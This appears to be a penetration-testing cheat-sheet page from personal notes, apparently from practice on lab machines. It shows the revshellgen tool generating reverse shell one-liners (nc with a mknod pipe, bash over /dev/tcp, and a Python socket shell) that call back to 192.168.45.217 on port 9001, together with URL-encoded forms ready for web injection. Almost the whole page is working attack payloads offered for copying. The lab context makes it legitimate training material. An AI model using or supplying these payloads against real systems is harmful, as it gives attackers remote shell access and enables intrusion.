---
layout: default
title: Revshellgen
parent: Shells
nav_order: 1
---

# Revshellgen

---

## nc-mknod

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/funboxeasy]
└─$ revshellgen -i 192.168.45.217 -p 9001 -t nc-mknod | tail -n 1
rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/funboxeasy]
└─$ urlencode "rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l"
rm%20%2Ftmp%2Fl%3Bmknod%20%2Ftmp%2Fl%20p%3B%2Fbin%2Fsh%200%3C%2Ftmp%2Fl%20%7C%20nc%20192.168.45.217%209001%201%3E%2Ftmp%2Fl

```

## bash

```bash
# Generate reverse shell payload
revshellgen -i 192.168.45.217 -p 9001 -t bash

# URL encode the payload
urlencode "bash -i >& /dev/tcp/192.168.45.217/9001 0>&1"

# Output
bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.217%2F9001%200%3E%261
```

## python

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ revshellgen -i 192.168.45.217 -p 9001 -t python

[+] Reverse shell command:

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.217",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

```
